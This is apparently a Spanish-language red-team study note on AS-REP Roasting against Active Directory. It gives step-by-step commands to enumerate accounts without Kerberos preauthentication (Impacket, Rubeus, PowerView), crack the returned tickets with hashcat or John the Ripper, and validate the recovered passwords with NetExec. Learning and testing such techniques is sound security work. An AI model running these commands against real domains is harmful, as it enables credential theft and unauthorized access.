>Es una técnica de movimiento lateral/escalada de privilegios en entornos de Active Directory que explota una configuración débil en las cuentas de usuario. A diferencia de [[Kerberoasting]], este ataque no se dirige a cuentas con SPN si no a cuentas de usuario que tengan habilitada la opción "Do not require Kerberos preauthentication" .

# Ejecución del ataque

Este ataque se puede realizar siempre que:
- Un usuario válido en el dominio (sin necesidad de privilegios especiales).
- Conectividad con el Controlador de Dominio.
- Capacidad para ejecutar herramientas que puedan solicitar tickets Kerberos.
# Herramientas

Las herramientas necesarias para poder desarrollar este ataque son:
- [[IMPACKET]] con  `GetNPUsers`, desde Linux
- [[00.- Herramientas/RUBEUS]] (con el argumento `/asreproast`) o [[00.- Herramientas/POWERVIEW]] (con el comando `Get-DomainUser -PreauthNotRequired`), desde Windows

# Requisitos previos

Para que el ataque se pueda llevar a cabo sin interrupciones, será necesario tener unas credenciales de un usuario de dominio válido (o una shell en el contexto de ese usuario). No se requiere un hash `NTLM` específico para iniciar el ataque, ya que cualquier usuario autenticado puede consultar el directorio activo.

# Fases
## Enumerar usuarios vulnerables

Primero, debemos identificar qué cuentas de usuario en el dominio tienen la configuración "No requerir preautenticación de Kerberos" habilitada. Con [[IMPACKET]] desde Linux, lo podemos hacer listando directamente y solicitando el ticket para aquellos que no requieren preautenticación.

```shell
impacket-GetNPUsers -dc-ip <IP_DEL_DC> <NOMBRE_DOMINIO>/<USUARIO_VALIDO> -no-pass
```

Este comando intentará obtener el TGT para _todos_ los usuarios. Si el usuario no es vulnerable, la herramienta lo ignorará silenciosamente o dará un error. Si es vulnerable, nos devolverá el ticket cifrado.

## Extraer el ticket (hash) de la cuenta vulnerable

Si queremos apuntar a un usuario específico del que sospechamos que es vulnerable, o para ser más silenciosos, podemos usar:

```shell
impacket-GetNPUsers -dc-ip <IP_DEL_DC> <NOMBRE_DOMINIO>/<USUARIO_VALIDO> -request-user <USUARIO_OBJETIVO> -no-pass
```

Para guardar la salida en un archivo y poder trabajar con ella más tarde, usamos la redirección o la opción `-outputfile`:

## Crackeo del ticket

Una vez tenemos los hashes en nuestro fichero, podemos intentar descifrarlos usando [[HASHCAT]] (modo `18200` para AS-REP Roasting) o [[JOHN THE RIPPER]].

### Con Hashcat
```shell
hashcat -m 18200 asrep_hashes.txt /ruta/a/wordlist.txt --force
```
### Con John the Ripper
```shell
john --format=krb5asrep asrep_hashes.txt --wordlist=/ruta/a/wordlist.txt
```

Si el crackeo tiene éxito, obtendremos la contraseña en texto claro de la cuenta objetivo.

## Validación de credenciales
Validaremos la credenciales usando la herramienta [[NETEXEC]]

```shell
nxc smb <IP> -u <user> -p <password>
```


